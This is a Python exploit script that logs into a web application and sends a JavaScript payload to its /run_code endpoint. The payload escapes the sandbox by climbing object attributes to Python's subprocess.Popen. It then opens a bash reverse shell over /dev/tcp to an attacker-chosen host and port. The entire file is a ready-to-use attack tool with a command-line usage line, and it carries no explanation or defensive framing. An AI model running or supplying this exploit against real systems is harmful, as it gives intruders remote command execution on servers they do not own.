#!/usr/bin/env python3
import requests
import sys


def make_payload(ip: str, port: int) -> str:
    payload = f"""let cmd = "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({{}})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {{
    let result;
    for(let i in o.__subclasses__()) {{
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {{
            return item
        }}
        if(item.__name__ != "type" && (result = findpopen(item))) {{
            return result
        }}
    }}
}}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
"""
    return str(payload)

def login(url, username, password) -> str | None:
    data = f"username={username}&password={password}"
    headers = {"Content-Type": "x-www-form-urlencoded"}
    try:
        r1 = requests.post(url + "/login", headers=headers, data=data, allow_redirects=False)
        if r1.status_code == 200:
            print("[-] Error:", r1.text)
            return None
        cookie = r1.cookies.get("session")
    except requests.exceptions.RequestException as e:
        print("[-] Error:", e)
        return None
    return str(cookie)

def main(url, ip: str, port: int, cookie) -> int:
    payload = make_payload(ip, int(port))
    headers = {"Content-Type": "application/json", "Cookie": f"session={cookie}"}
    data = {"code": payload}
    try:
        r1 = requests.post(url + "/run_code", headers=headers, json=data)
    except requests.exceptions.RequestException as e:
        print("[-] Error:", e)
        return 1
    return 0

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage:", sys.argv[0], "<url> <username:password> <lhost:lport>")
        sys.exit(1)

    url = str(sys.argv[1].lstrip("/"))
    user, passwd = sys.argv[2].split(":")
    ip, port = sys.argv[3].split(":")

    cookie = login(url, user, passwd)
    if cookie is None:
        sys.exit(1)
    main(url, ip, port, cookie)

